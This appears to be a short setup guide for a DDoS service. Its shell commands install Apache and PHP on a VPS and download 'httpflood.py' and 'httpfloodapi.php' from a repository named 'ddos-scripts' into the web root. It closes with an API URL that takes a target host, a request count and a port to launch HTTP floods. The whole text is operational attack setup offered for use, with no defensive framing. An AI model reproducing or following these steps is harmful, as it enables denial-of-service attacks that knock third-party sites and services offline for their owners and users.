sudo apt update
sudo apt install apache2 php libapache2-mod-php php7.0-cli
sudo apt-get install libssh2-1 php-ssh2 -y
sudo wget https://raw.githubusercontent.com/runconnor/ddos-scripts/master/httpflood.py
cd /var/www/html
sudo wget https://raw.githubusercontent.com/runconnor/ddos-scripts/master/httpfloodapi.php
sudo systemctl restart apache2

Visit http://your_vps_ip/httpfloodapi.php to ensure everything was installed correctly before trying to execute.

API urls:

http://vps_ip/httpfloodapi.php?host={$host}&requests={$requests}&port={$port)

